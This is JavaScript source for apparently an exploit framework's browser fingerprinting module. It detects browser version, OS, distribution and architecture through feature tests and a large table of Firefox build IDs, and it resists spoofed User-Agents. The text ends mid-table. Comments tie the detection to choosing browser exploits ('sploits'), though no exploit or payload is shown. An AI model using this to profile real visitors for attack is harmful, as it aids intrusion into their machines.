var clients_opera  = "Opera";
var clients_ie     = "MSIE";
var clients_ff     = "Firefox";
var clients_chrome = "Chrome";
var clients_safari = "Safari";

var oses_linux     = "Linux";
var oses_android   = "Android";
var oses_windows   = "Windows";
var oses_mac_osx   = "Mac OS X";
var oses_apple_ios = "iOS";
var oses_freebsd   = "FreeBSD";
var oses_netbsd    = "NetBSD";
var oses_openbsd   = "OpenBSD";

var arch_armle    = "armle";
var arch_x86      = "x86";
var arch_x86_64   = "x86_64";
var arch_ppc      = "ppc";
var arch_mipsle   = "mipsle";

var os_detect = {};

/**
 * This can reliably detect browser versions for IE and Firefox even in the
 * presence of a spoofed User-Agent.  OS detection is more fragile and
 * requires truthful navigator.appVersion and navigator.userAgent strings in
 * order to be accurate for more than just IE on Windows.
 **/
os_detect.getVersion = function(){
	//Default values:
	var os_name;
	var os_vendor;
	var os_device;
	var os_flavor;
	var os_sp;
	var os_lang;
	var ua_name;
	var ua_version;
	var arch = "";
	var useragent = navigator.userAgent;
	// Trust but verify...
	var ua_is_lying = false;

	var version = "";
	var unknown_fingerprint = null;

	var css_is_valid = function(prop, propCamelCase, css) {
		if (!document.createElement) return false;
		var d = document.createElement('div');
		d.setAttribute('style', prop+": "+css+";")
		return d.style[propCamelCase] === css;
	}

	var input_type_is_valid = function(input_type) {
		if (!document.createElement) return false;
		var input = document.createElement('input');
		input.setAttribute('type', input_type);
		return input.type == input_type;
	}

	//--
	// Client
	//--
	if (window.opera) {
		ua_name = clients_opera;
		if (!navigator.userAgent.match(/Opera/)) {
			ua_is_lying = true;
		}
		// This seems to be completely accurate, e.g. "9.21" is the return
		// value of opera.version() when run on Opera 9.21
		ua_version = opera.version();
		if (!os_name) {
			// The 'inconspicuous' argument is there to give us a real value on
			// Opera 6 where, without it, the return value is supposedly
			// 'Hm, were you only as smart as Bjorn Vermo...'
			// though I have not verfied this claim.
			switch (opera.buildNumber('inconspicuous')) {
				case "344":   // opera-9.0-20060616.1-static-qt.i386-en-344
				case "1347":  // Opera 9.80 / Ubuntu 10.10 (Karmic Koala)
				case "2091":  // opera-9.52-2091.gcc3-shared-qt3.i386.rpm
				case "2444":  // opera-9.60.gcc4-shared-qt3.i386.rpm
				case "2474":  // Opera 9.63 / Debian Testing (Lenny)
				case "4102":  // Opera 10.00 / Ubuntu 8.04 LTS (Hardy Heron)
				case "6386":  // 10.61
					os_name = oses_linux;
					break;
				case "1074":  // Opera 11.50 / Windows XP
				case "1100":  // Opera 11.52 / Windows XP
				case "3445":  // 10.61
				case "3516":  // Opera 10.63 / Windows XP
				case "7730":  // Opera 8.54 / Windows XP
				case "8502":  // "Opera 9 Eng Setup.exe"
				case "8679":  // "Opera_9.10_Eng_Setup.exe"
				case "8771":  // "Opera_9.20_Eng_Setup.exe"
				case "8776":  // "Opera_9.21_Eng_Setup.exe"
				case "8801":  // "Opera_9.22_Eng_Setup.exe"
				case "10108": // "Opera_952_10108_en.exe"
				case "10467": // "Opera_962_en_Setup.exe"
				case "10476": // Opera 9.63 / Windows XP
				case "WMD-50433": // Windows Mobile - "Mozilla/5.0 (Windows Mobile; U; en; rv:1.8.1) Gecko/20061208 Firefox/2.0.0 Opera 10.00"
					os_name = oses_windows;
					break;
				case "2480":  // Opera 9.64 / FreeBSD 7.0
					os_name = oses_freebsd;
					break;
				case "6386":  // 10.61
					os_name = oses_mac_osx;
					break;
				case "1407":
					// In the case of mini versions, the UA is quite a bit
					// harder to spoof, so it's correspondingly easier to
					// trust. Unfortunately, despite being fairly truthful in
					// what OS it's running on, Opera mini seems to lie like a
					// rug in regards to the browser version.
					//
					// iPhone, iOS 5.0.1
					//  Opera/9.80 (iPhone; Opera Mini/7.1.32694/27.1407; U; en) Presto/2.8.119 Version/11.10.10
					// Android 2.3.6, opera mini 7.1
					//  Opera/9.80 (Android; Opera Mini/7.29530/27.1407; U; en) Presto/2.8.119 Version/11.101.10
					if (navigator.userAgent.indexOf("Android")) {
						os_name = oses_android;
					} else if (navigator.userAgent.indexOf("iPhone")) {
						os_name = oses_apple_ios;
						os_device = "iPhone";
					}
					break;
				// A few are ambiguous, record them here
				case "1250":
					// Opera 9.80 / Windows XP
					// Opera 11.61 / Windows XP
					// Opera 11.61 / Debian 4.0 (Etch)
					break;
				default:
					unknown_fingerprint = opera.buildNumber('inconspicuous');
					break;
			}
		}
	} else if (typeof window.onmousewheel != 'undefined' && ! (typeof ScriptEngineMajorVersion == 'function') ) { // IE 10 now has onmousewheel

		// Then this is webkit, could be Safari or Chrome.
		// Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.27.1 (KHTML, like Gecko) Version/3.2.1 Safari/525.27.1
		// Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.5 (KHTML, like Gecko) Chrome/4.0.249.78 Safari/532.5
		// Mozilla/5.0 (Linux; U; Android 2.2; en-au; GT-I9000 Build/FROYO) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1
		// Mozilla/5.0 (iPod; U; CPU iPhone OS 4_2_1 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8C148
		// Mozilla/5.0 (iPad; U; CPU OS 3_2_1 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Mobile/7B405
		// Mozilla/5.0 (iPhone; U; CPU like Mac OS X; en) AppleWebKit/420+ (KHTML, like Gecko) Version/3.0 Mobile/1A543a Safari/419.3

		// Google Chrome has window.google (older versions), window.chromium (older versions), and window.window.chrome (3+)
		if (window.chromium || window.google || window.chrome) {
			ua_name = clients_chrome;
			search = "Chrome";
		} else {
			ua_name = clients_safari;
			search = "Version";
		}

		platform = navigator.platform.toLowerCase();
		// Just to be a pain, iPod and iPad both leave off "Safari" and
		// "Version" in the UA, see example above.  Grab the webkit version
		// instead.  =/
		if (platform.match(/ipod/)) {
			os_name = oses_apple_ios;
			os_device = "iPod";
			arch = arch_armle;
			search = "AppleWebKit";
		} else if (platform.match(/ipad/)) {
			os_name = oses_apple_ios;
			os_device = "iPad";
			arch = arch_armle;
			search = "AppleWebKit";
		} else if (platform.match(/iphone/)) {
			os_name = oses_apple_ios;
			os_device = "iPhone";
			arch = arch_armle;
		} else if (platform.match(/macintel/)) {
			os_name = oses_mac_osx;
			arch = arch_x86;
		} else if (platform.match(/linux/)) {
			os_name = oses_linux;

			if (platform.match(/x86_64/)) {
				arch = arch_x86_64;
			} else if (platform.match(/arm/)) {
				arch = arch_armle;
			} else if (platform.match(/x86/)) {
				arch = arch_x86;
			} else if (platform.match(/mips/)) {
				arch = arch_mipsle;
			}

			// Android overrides Linux
			if (navigator.userAgent.match(/android/i)) {
				os_name = oses_android;
			}
		} else if (platform.match(/windows/)) {
			os_name = oses_windows;
		}

		ua_version = this.searchVersion(search, navigator.userAgent);
		if (!ua_version || 0 == ua_version.length) {
			ua_is_lying = true;
		}
	} else if (navigator.oscpu && !document.all && navigator.taintEnabled || 'MozBlobBuilder' in window) {
		// Use taintEnabled to identify FF since other recent browsers
		// implement window.getComputedStyle now.  For some reason, checking for
		// taintEnabled seems to cause IE 6 to stop parsing, so make sure this
		// isn't IE first.

		// Also check MozBlobBuilder because FF 9.0.1 does not support taintEnabled

		// Then this is a Gecko derivative, assume Firefox since that's the
		// only one we have sploits for.  We may need to revisit this in the
		// future.  This works for multi/browser/mozilla_compareto against
		// Firefox and Mozilla, so it's probably good enough for now.
		ua_name = clients_ff;
		// Thanks to developer.mozilla.org "Firefox for developers" series for most
		// of these.
		// Release changelogs: http://www.mozilla.org/en-US/firefox/releases/
		if ('closest' in Element.prototype) {
			ua_version = '35.0';
		} else if ('matches' in Element.prototype) {
			ua_version = '34.0';
		} else if ('RadioNodeList' in window) {
			ua_version = '33.0';
		} else if ('copyWithin' in Array.prototype) {
			ua_version = '32.0';
		} else if ('fill' in Array.prototype) {
			ua_version = '31.0';
		} else if (css_is_valid('background-blend-mode', 'backgroundBlendMode', 'multiply')) {
			ua_version = '30.0';
		} else if (css_is_valid('box-sizing', 'boxSizing', 'border-box')) {
			ua_version = '29.0';
		} else if (css_is_valid('flex-wrap', 'flexWrap', 'nowrap')) {
			ua_version = '28.0';
		} else if (css_is_valid('cursor', 'cursor', 'grab')) {
			ua_version = '27.0';
		} else if (css_is_valid('image-orientation',
		                 'imageOrientation',
		                 '0deg')) {
			ua_version = '26.0';
		} else if (css_is_valid('background-attachment',
		                 'backgroundAttachment',
		                 'local')) {
			ua_version = '25.0';
		} else if ('DeviceStorage' in window && window.DeviceStorage &&
				'default' in window.DeviceStorage.prototype) {
			// https://bugzilla.mozilla.org/show_bug.cgi?id=874213
			ua_version = '24.0';
		} else if (input_type_is_valid('range')) {
			ua_version = '23.0';
		} else if ('HTMLTimeElement' in window) {
			ua_version = '22.0';
		} else if ('createElement' in document &&
		           document.createElement('main') &&
		           document.createElement('main').constructor === window['HTMLElement']) {
			ua_version = '21.0';
		} else if ('imul' in Math) {
			ua_version = '20.0';
		} else if (css_is_valid('font-size', 'fontSize', '23vmax')) {
			ua_version = '19.0';
		} else if ('devicePixelRatio' in window) {
			ua_version = '18.0';
		} else if ('createElement' in document &&
		           document.createElement('iframe') &&
		           'sandbox' in document.createElement('iframe')) {
			ua_version = '17.0';
		} else if ('mozApps' in navigator && 'install' in navigator.mozApps) {
			ua_version = '16.0';
		} else if ('HTMLSourceElement' in window &&
		           HTMLSourceElement.prototype &&
		           'media' in HTMLSourceElement.prototype) {
			ua_version = '15.0';
		} else if ('mozRequestPointerLock' in document.body) {
			ua_version = '14.0';
		} else if ('Map' in window) {
			ua_version = "13.0";
		} else if ('mozConnection' in navigator) {
			ua_version = "12.0";
		} else if ('mozVibrate' in navigator) {
			ua_version = "11.0";
		} else if (css_is_valid('-moz-backface-visibility', 'MozBackfaceVisibility', 'hidden')) {
			ua_version = "10.0";
		} else if ('doNotTrack' in navigator) {
			ua_version = "9.0";
		} else if ('insertAdjacentHTML' in document.body) {
			ua_version = "8.0";
		} else if ('ondeviceorientation' in window && !('createEntityReference' in document)) {
			ua_version = "7.0";
		} else if ('MozBlobBuilder' in window) {
			ua_version = "6.0";
		} else if ('isGenerator' in Function) {
			ua_version = "5.0";
		} else if ('isArray' in Array) {
			ua_version = "4.0";
		} else if (document.readyState) {
			ua_version = "3.6";
		} else if (String.trimRight) {
			ua_version = "3.5";
		} else if (document.getElementsByClassName) {
			ua_version = "3";
		} else if (window.Iterator) {
			ua_version = "2";
		} else if (Array.every) {
			ua_version = "1.5";
		} else {
			ua_version = "1";
		}
		if (navigator.oscpu != navigator.platform) {
			ua_is_lying = true;
		}
		// oscpu is unaffected by changes in the useragent and has values like:
		//    "Linux i686"
		//    "Windows NT 6.0"
		// haven't tested on 64-bit Windows
		version = navigator.oscpu;
		if (version.match(/i.86/)) {
			arch = arch_x86;
		}
		if (version.match(/x86_64/)) {
			arch = arch_x86_64;
		}
		if (version.match(/Windows/)) {
			os_name = oses_windows;
			// Technically these will mismatch server OS editions, but those are
			// rarely used as client systems and typically have the same exploit
			// characteristics as the associated client.
			switch(version) {
				case "Windows NT 5.0": os_name = "Windows 2000"; break;
				case "Windows NT 5.1": os_name = "Windows XP"; break;
				case "Windows NT 5.2": os_name = "Windows 2003"; break;
				case "Windows NT 6.0": os_name = "Windows Vista"; break;
				case "Windows NT 6.1": os_name = "Windows 7"; break;
				case "Windows NT 6.2": os_name = "Windows 8"; break;
				case "Windows NT 6.3": os_name = "Windows 8.1"; break;
			}
		}
		if (version.match(/Linux/)) {
			os_name = oses_linux;
		}
		// end navigator.oscpu checks

		// buildID is unaffected by changes in the useragent and typically has
		// the compile date which in some cases can be used to map to specific
		// Version & O/S (including Distro and even Arch). Depending upon the
		// buildID, sometime navigator.productSub will be needed.
		//
		// This technique, and the laboriously compiled associated table,
		// submitted by Mark Fioravanti.

		var buildid = navigator.buildID;

		switch(buildid) {
			case "2008041514": ua_version = "3.0.0.b5"; os_name = oses_linux; os_vendor = "Ubuntu"; arch = arch_x86; break;
			case "2008041515": ua_version = "3.0.0.b5"; os_name = oses_linux; os_vendor = "Ubuntu"; arch = arch_x86_64; break;
			case "2008052312": ua_version = "3.0.0"; os_name = oses_linux; os_vendor = "Ubuntu"; arch = arch_x86; break;
			case "2008052906": ua_version = "3.0.0"; os_name = oses_windows; break;
			case "2008052909": ua_version = "3.0.0.rc1"; os_name = oses_linux; os_vendor = "Ubuntu"; arch = arch_x86; break;
			case "2008052912": ua_version = "3.0.0"; os_name = oses_linux; break;
			case "2008060309": ua_version = "3.0.0"; os_name = oses_linux; os_vendor = "Ubuntu"; break;
			case "2008070205": ua_version = "2.0.0.16"; os_name = oses_windows; break;
			case "2008070206": ua_version = "3.0.1"; os_name = oses_linux; break;
			case "2008070208": ua_version = "3.0.1"; os_name = oses_windows; break;
			case "2008071222": ua_version = "3.0.1"; os_name = oses_linux; os_vendor = "Ubuntu"; arch = arch_x86; break;
			case "2008072820":
				switch (navigator.productSub) {
					case "2008072820": ua_version = "3.0.1"; os_name = oses_linux; break;
					case "2008092313": ua_version = "3.0.2"; os_name = oses_linux; break;
				} break;
			case "2008082909": ua_version = "2.0.0.17"; os_name = oses_windows; break;
			case "2008091618": ua_version = "3.0.2"; os_name = oses_linux; break;
			case "2008091620": ua_version = "3.0.2"; os_name = oses_windows; break;
			case "2008092313": ua_version = "3.0.3"; os_name = oses_linux; os_vendor = "Ubuntu"; arch = arch_x86; break;
			case "2008092416": ua_version = "3.0.3"; os_name = oses_linux; break;
			case "2008092417": ua_version = "3.0.3"; os_name = oses_windows; break;
			case "2008092510": ua_version = "3.0.4"; os_name = oses_linux; os_vendor = "Ubuntu"; arch = arch_x86; break;
			case "2008101315":
				switch (navigator.productSub) {
					case "2008101315": ua_version = "3.0.3"; os_name = oses_linux; break;
					case "2008111318": ua_version = "3.0.4"; os_name = oses_linux; arch = arch_x86; break;
				} break;
			case "2008102918": ua_version = "2.0.0.18"; os_name = oses_windows; break;
			case "2008102920": ua_version = "3.0.4"; break;
			case "2008112309": ua_version = "3.0.4"; os_name = oses_linux; os_vendor = "Debian"; break; // browsershots: Iceweasel 3.0.4 / Debian Testing (Lenny)
			case "2008111317": ua_version = "3.0.5"; os_name = oses_linux; os_vendor = "Ubuntu"; arch = arch_x86; break;
			case "2008111318": ua_version = "3.0.5"; os_name = oses_linux; os_vendor = "Ubuntu"; break;
			case "2008120119": ua_version = "2.0.0.19"; os_name = oses_windows; break;
			case "2008120121": ua_version = "3.0.5"; os_name = oses_linux; break;
			case "2008120122": ua_version = "3.0.5"; os_name = oses_windows; break;
			case "2008121623": ua_version = "2.0.0.19"; os_name = oses_linux; os_vendor = "Ubuntu"; break; // browsershots: Firefox 2.0.0.19 / Ubuntu 8.04 LTS (Hardy Heron)
			case "2008121709": ua_version = "2.0.0.20"; os_name = oses_windows; break;
			case "2009011912": ua_version = "3.0.6"; os_name = oses_linux; break;
			case "2009011913": ua_version = "3.0.6"; os_name = oses_windows; break;
			case "2009012615": ua_version = "3.0.6"; os_name = oses_linux; os_vendor = "Ubuntu"; arch = arch_x86; break;
			case "2009012616": ua_version = "3.0.6"; os_name = oses_linux; os_vendor = "Ubuntu"; arch = arch_x86; break;
			case "2009021906": ua_version = "3.0.7"; os_name = oses_linux; break;
			case "2009021910": ua_version = "3.0.7"; os_name = oses_windows; break;
			case "2009030422": ua_version = "3.0.8"; os_name = oses_linux; os_vendor = "Ubuntu"; arch = arch_x86; break;
			case "2009032608": ua_version = "3.0.8"; os_name = oses_linux; break;
			case "2009032609": ua_version = "3.0.8"; os_name = oses_windows; break;
			case "2009032711": ua_version = "3.0.9"; os_name = oses_linux; os_vendor = "Ubuntu"; arch = arch_x86; break;
			case "2009033100":
				switch (navigator.productSub) {
					case "2009033100": ua_version = "3.0.8"; os_name = oses_linux; os_vendor = "Ubuntu"; break;
					case "2009042113": ua_version = "3.0.9"; os_name = oses_linux; os_vendor = "Ubuntu"; arch = arch_x86; break;
				} break;
			case "2009040820": ua_version = "3.0.9"; os_name = oses_linux; break;
			case "2009040821": ua_version = "3.0.9"; os_name = oses_windows; break;
			case "2009042113": ua_version = "3.0.10"; os_name = oses_linux; os_vendor = "Ubuntu"; arch = arch_x86; break;
			case "2009042114": ua_version = "3.0.10"; os_name = oses_linux; os_vendor = "Ubuntu"; arch = arch_x86_64; break;
			case "2009042315": ua_version = "3.0.10"; os_name = oses_linux; break;
			case "2009042316": ua_version = "3.0.10"; os_name = oses_windows; break;
			case "20090427153806": ua_version = "3.5.0.b4"; os_name = oses_linux; os_vendor = "Fedora"; arch = arch_x86; break;
			case "20090427153807": ua_version = "3.5.0.b4"; os_name = oses_linux; os_vendor = "Fedora"; arch = arch_x86_64; break;
			case "2009060214": ua_version = "3.0.11"; os_name = oses_linux; break;
			case "2009060215": ua_version = "3.0.11"; os_name = oses_windows; break;
			case "2009060308":
				switch (navigator.productSub) {
					case "2009060308": ua_version = "3.0.11"; os_name = oses_linux; os_vendor = "Ubuntu"; arch = arch_x86; break;
					case "2009070811": ua_version = "3.0.12"; os_name = oses_linux; os_vendor = "Ubuntu"; arch = arch_x86; break;
				} break;
			case "2009060309":
				switch (navigator.productSub) {
					case "2009060309": ua_version = "3.0.11"; os_name = oses_linux; os_vendor = "Ubuntu"; break;
					case "2009070811": ua_version = "3.0.12"; os_name = oses_linux; os_vendor = "Ubuntu"; arch = arch_x86_64; break;
				} break;
			case "2009060310": ua_version = "3.0.11"; os_name = oses_linux; os_vendor = "BackTrack"; break;
			case "2009062005": ua_version = "3.0.11"; os_name = oses_linux; os_vendor = "PCLunixOS"; break;
			case "20090624012136": ua_version = "3.5.0"; os_name = oses_mac_osx; break;
			case "20090624012820": ua_version = "3.5.0"; os_name = oses_linux; break;
			case "20090701234143": ua_version = "3.5.0"; os_name = oses_freebsd; os_vendor = "PC-BSD"; arch = arch_x86; break;
			case "20090702060527": ua_version = "3.5.0"; os_name = oses_freebsd; os_vendor = "PC-BSD"; arch = arch_x86_64; break;
			case "2009070610": ua_version = "3.0.12"; os_name = oses_linux; break;
			case "2009070611": ua_version = "3.0.12"; os_name = oses_windows; break;
			case "2009070811": ua_version = "3.0.13"; os_name = oses_linux; os_vendor = "Ubuntu"; break;
			case "20090715083437": ua_version = "3.5.1"; os_name = oses_mac_osx; break;
			case "20090715083816": ua_version = "3.5.1"; os_name = oses_linux; break;
			case "20090715094852": ua_version = "3.5.1"; os_name = oses_windows; break;
			case "2009072202": ua_version = "3.0.12"; os_name = oses_linux; os_vendor = "Oracle"; break;
			case "2009072711": ua_version = "3.0.12"; os_name = oses_linux; os_vendor = "CentOS"; break;
			case "20090729211433": ua_version = "3.5.2"; os_name = oses_mac_osx; break;
			case "20090729211829": ua_version = "3.5.2"; os_name = oses_linux; break;
			case "20090729225027": ua_version = "3.5.2"; os_name = oses_windows; break;
			case "2009073021": ua_version = "3.0.13"; os_name = oses_linux; break;
			case "2009073022": ua_version = "3.0.13"; os_name = oses_windows; break;
			case "20090824085414": ua_version = "3.5.3"; os_name = oses_mac_osx; break;
			case "20090824085743": ua_version = "3.5.3"; os_name = oses_linux; break;
			case "20090824101458": ua_version = "3.5.3"; os_name = oses_windows; break;
			case "2009082707": ua_version = "3.0.14"; break;
			case "2009090216": ua_version = "3.0.14"; os_name = oses_linux; os_vendor = "Ubuntu"; arch = arch_x86; break;
			case "20090914014745": ua_version = "3.5.3"; os_name = oses_linux; os_vendor = "Mandriva"; arch = arch_x86; break;
			case "20090915065903": ua_version = "3.5.3"; os_name = oses_linux; os_vendor = "Sabayon"; arch = arch_x86_64; break;
			case "20090915070141": ua_version = "3.5.3"; os_name = oses_linux; os_vendor = "Sabayon"; arch = arch_x86; break;
			case "20091007090112": ua_version = "3.5.3"; os_name = oses_linux; os_vendor = "Ubuntu"; arch = arch_x86; break; // Could also be Mint x86
			case "20091007095328": ua_version = "3.5.3"; os_name = oses_linux; os_vendor = "Ubuntu"; arch = arch_x86_64; break; // Could also be Mint x86-64
			case "2009101600":
				switch (navigator.productSub) {
					case "2009101600": ua_version = "3.0.15"; break; // Can be either Mac or Linux
					case "20091016": ua_version = "3.5.4"; os_name = oses_linux; os_vendor = "SUSE"; arch = arch_x86; break;
				} break;
			case "2009101601": ua_version = "3.0.15"; os_name = oses_windows; break;
			case "20091016081620": ua_version = "3.5.4"; os_name = oses_mac_osx; break;
			case "20091016081727": ua_version = "3.5.4"; os_name = oses_linux; break;
			case "20091016092926": ua_version = "3.5.4"; os_name = oses_windows; break;
			case "20091020122601": ua_version = "3.5.4"; os_name = oses_linux; os_vendor = "Ubuntu"; arch = arch_x86_64; break; // Could also be Mint x86-64
			case "2009102814":
				switch (navigator.productSub) {
					case "2009121601": ua_version = "3.0.16"; os_name = oses_linux; os_vendor = "Ubuntu"; break;
					case "2009121602": ua_version = "3.0.16"; os_name = oses_linux; os_vendor = "Ubuntu"; break;
					case "2010010604": ua_version = "3.0.17"; os_name = oses_linux; os_vendor = "Mint"; break;
					case "2010021501": ua_version = "3.0.17;xul1.9.0.18"; os_name = oses_linux; os_vendor = "Mint"; arch = arch_x86; break;
					case "2010021502": ua_version = "3.0.17;xul1.9.0.18"; os_name = oses_linux; os_vendor = "Mint"; arch = arch_x86_64; break;
				} break;
			case "2009102815":
				switch (navigator.productSub) {
					case "2009102815": ua_version = "3.0.15"; os_name = oses_linux; os_vendor = "Ubuntu"; arch = arch_x86; break;
					case "2009121601": ua_version = "3.0.16"; os_name = oses_linux; os_vendor = "Ubuntu"; arch = arch_x86; break;
				} break;
			case "20091029152254": ua_version = "3.6.0.b1"; os_name = oses_linux; break;
			case "20091029171059": ua_version = "3.6.0.b1"; os_name = oses_windows; break;
			case "20091102134505": ua_version = "3.5.5"; os_name = oses_mac_osx; break;
			case "20091102141836": ua_version = "3.5.5"; os_name = oses_linux; break;
			case "20091102152451": ua_version = "3.5.5"; os_name = oses_windows; break;
			case "2009110421": ua_version = "3.0.15"; os_name = oses_freebsd; arch = arch_x86; break;
			case "20091106091959": ua_version = "3.5.5"; os_name = oses_linux; os_vendor = "Mandriva"; arch = arch_x86; break;
			case "20091106140514": ua_version = "3.5.5"; os_name = oses_freebsd; os_vendor = "PC-BSD"; arch = arch_x86; break;
			case "20091106145609": ua_version = "3.5.5"; os_name = oses_freebsd; os_vendor = "PC-BSD"; arch = arch_x86_64; break;
			case "20091108163911": ua_version = "3.6.0.b2"; os_name = oses_linux; break;
			case "20091108181924": ua_version = "3.6.0.b2"; os_name = oses_windows; break;
			case "20091109125225":
				switch (navigator.productSub) {
					case "20091109": ua_version = "3.5.5"; os_name = oses_linux; os_vendor = "Ubuntu"; arch = arch_x86; break;
					case "20091215": ua_version = "3.5.6"; os_name = oses_linux; os_vendor = "Ubuntu"; arch = arch_x86; break;
				} break;
			case "20091109134913": ua_version = "3.5.5"; os_name = oses_linux; os_vendor = "Ubuntu"; arch = arch_x86_64; break;
			case "20091115172547": ua_version = "3.6.0.b3"; os_name = oses_linux; break;
			case "20091115182845": ua_version = "3.6.0.b3"; os_name = oses_windows; break;
			case "20091124201530": ua_version = "3.6.0.b4"; os_name = oses_mac_osx; break;
			case "20091124201751": ua_version = "3.6.0.b4"; os_name = oses_linux; break;
			case "20091124213835": ua_version = "3.6.0.b4"; os_name = oses_windows; break;
			case "2009120100": ua_version = "3.5.6"; os_name = oses_linux; os_vendor = "SUSE"; break;
			case "20091201203240": ua_version = "3.5.6"; os_name = oses_mac_osx; break;
			case "20091201204959": ua_version = "3.5.6"; os_name = oses_linux; break;
			case "20091201220228": ua_version = "3.5.6"; os_name = oses_windows; break;
			case "2009120206": ua_version = "3.0.16"; break; // Can be either Mac or Linux
			case "2009120208": ua_version = "3.0.16"; os_name = oses_windows; break;
			case "20091204132459": ua_version = "3.6.0.b5"; os_name = oses_linux; break;
			case "20091204132509": ua_version = "3.6.0.b5"; os_name = oses_mac_osx; break;
			case "20091204143806": ua_version = "3.6.0.b5"; os_name = oses_windows; break;
			case "20091215230859": ua_version = "3.5.7"; os_name = oses_linux; os_vendor = "Ubuntu"; arch = arch_x86; break;
			case "20091215230946": ua_version = "3.5.7"; os_name = oses_linux; os_vendor = "Ubuntu"; arch = arch_x86_64; break;
			case "20091215231400": ua_version = "3.5.7"; os_name = oses_linux; os_vendor = "Ubuntu"; arch = arch_x86; break; // Could also be Mint x86
			case "20091215231754":
				switch (navigator.productSub) {
					case "20091215": ua_version = "3.5.6"; os_name = oses_linux; os_vendor = "Ubuntu"; arch = arch_x86_64; break;
					case "20100106": ua_version = "3.5.7"; os_name = oses_linux; os_vendor = "Ubuntu"; arch = arch_x86_64; break; // Could also be Mint x86-64
				} break;
			case "2009121601":
				switch (navigator.productSub) {
					case "2009121601": ua_version = "3.0.16"; os_name = oses_linux; os_vendor = "Ubuntu"; arch = arch_x86_64; break;
					case "2010010604": ua_version = "3.0.17"; os_name = oses_linux; os_vendor = "Ubuntu"; break; // Could also be Mint x86-64
				} break;
			case "2009121602": ua_version = "3.0.17"; os_name = oses_linux; os_vendor = "Ubuntu"; break;
			case "20091216104148": ua_version = "3.5.6"; os_name = oses_linux; os_vendor = "Mandriva"; break;
			case "20091216132458": ua_version = "3.5.6"; os_name = oses_linux; os_vendor = "Fedora"; arch = arch_x86; break;
			case "20091216132537": ua_version = "3.5.6"; os_name = oses_linux; os_vendor = "Fedora"; arch = arch_x86_64; break;
			case "20091216142458": ua_version = "3.5.6"; os_name = oses_linux; os_vendor = "Fedora"; arch = arch_x86_64; break;
			case "20091216142519": ua_version = "3.5.6"; os_name = oses_linux; os_vendor = "Fedora"; arch = arch_x86; break;
			case "2009121708": ua_version = "3.0.16"; os_name = oses_linux; os_vendor = "CentOS"; arch = arch_x86; break;
			case "20091221151141": ua_version = "3.5.7"; os_name = oses_mac_osx; break;
			case "20091221152502": ua_version = "3.5.7"; os_name = oses_linux; break;
			case "2009122115": ua_version = "3.0.17"; break; // Can be either Mac or Linux
			case "20091221164558": ua_version = "3.5.7"; os_name = oses_windows; break;
			case "2009122116": ua_version = "3.0.17"; os_name = oses_windows; break;
			case "2009122200": ua_version = "3.5.7"; os_name = oses_linux; os_vendor = "SUSE"; break;
			case "20091223231431": ua_version = "3.5.6"; os_name = oses_linux; os_vendor = "PCLunixOS"; arch = arch_x86; break;
			case "20100105194006": ua_version = "3.6.0.rc1"; os_name = oses_mac_osx; break;
			case "20100105194116": ua_version = "3.6.0.rc1"; os_name = oses_linux; break;
			case "20100105212446": ua_version = "3.6.0.rc1"; os_name = oses_windows; break;
			case "2010010604": ua_version = "3.0.18"; os_name = oses_linux; os_vendor = "Ubuntu"; break;
			case "20100106054534": ua_version = "3.5.8"; os_name = oses_linux; os_vendor = "Ubuntu"; arch = arch_x86; break; // Could also be Mint x86
			case "20100106054634": ua_version = "3.5.8"; os_name = oses_linux; os_vendor = "Ubuntu"; arch = arch_x86_64; break; // Could also be Mint x86-64
			case "2010010605": ua_version = "3.0.18"; os_name = oses_linux; os_vendor = "Ubuntu"; arch = arch_x86_64; break;
			case "20100106211825": ua_version = "3.5.7"; os_name = oses_freebsd; os_vendor = "PC-BSD"; arch = arch_x86; break;
			case "20100106212742": ua_version = "3.5.7"; os_name = oses_freebsd; os_vendor = "PC-BSD"; arch = arch_x86_64; break;
			case "20100106215614": ua_version = "3.5.7"; os_name = oses_freebsd; os_vendor = "PC-BSD"; arch = arch_x86; break;
			case "20100110112429": ua_version = "3.5.7"; os_name = oses_linux; os_vendor = "Mandriva"; break;
			case "20100115132715": ua_version = "3.6.0"; os_name = oses_mac_osx; break;
			case "20100115133306": ua_version = "3.6.0"; os_name = oses_linux; break;
			case "20100115144158": ua_version = "3.6.0"; os_name = oses_windows; break;
			case "20100125074043": ua_version = "3.6.0"; os_name = oses_linux; os_vendor = "Ubuntu"; arch = arch_x86; break; // Could also be Mint x86
			case "20100125074127": ua_version = "3.6.0"; os_name = oses_linux; os_vendor = "Ubuntu"; arch = arch_x86_64; break; // Could also be Mint x86-64
			case "20100125204847": ua_version = "3.6.0"; os_name = oses_linux; os_vendor = "Sabayon"; arch = arch_x86; break; // Could also be Mint x86
			case "20100125204903": ua_version = "3.6.0"; os_name = oses_linux; os_vendor = "Sabayon"; arch = arch_x86_64; break; // Could also be Mint x86-64
			case "20100202152834": ua_version = "3.5.8"; os_name = oses_mac_osx; break;
			case "20100202153512": ua_version = "3.5.8"; os_name = oses_linux; break;
			case "20100202165920": ua_version = "3.5.8"; os_name = oses_windows; break;
			case "2010020219": ua_version = "3.0.18"; os_name = oses_mac_osx; break;
			case "2010020220": ua_version = "3.0.18"; os_name = oses_windows; break;
			case "2010020400": ua_version = "3.5.8"; os_name = oses_linux; os_vendor = "SUSE"; break;
			case "20100212131909": ua_version = "3.6.0.2"; os_name = oses_linux; os_vendor = "Ubuntu"; arch = arch_x86; break;
			case "20100212132013": ua_version = "3.6.0.2"; os_name = oses_linux; os_vendor = "Ubuntu"; arch = arch_x86_64; break;
			case "20100216105329": ua_version = "3.5.8"; os_name = oses_linux; os_vendor = "Fedora"; arch = arch_x86_64; break;
			case "20100216105348": ua_version = "3.5.8"; os_name = oses_linux; os_vendor = "Fedora"; arch = arch_x86; break;
			case "20100216105410": ua_version = "3.5.8"; os_name = oses_linux; os_vendor = "Fedora"; arch = arch_x86; break;
			case "20100216110009": ua_version = "3.5.8"; os_name = oses_linux; os_vendor = "Fedora"; arch = arch_x86_64; break;
			case "2010021718": ua_version = "3.0.18"; os_name = oses_linux; os_vendor = "CentOS"; arch = arch_x86; break;
			case "20100218022359": ua_version = "3.6.0.4"; os_name = oses_linux; os_vendor = "Ubuntu"; arch = arch_x86; break;
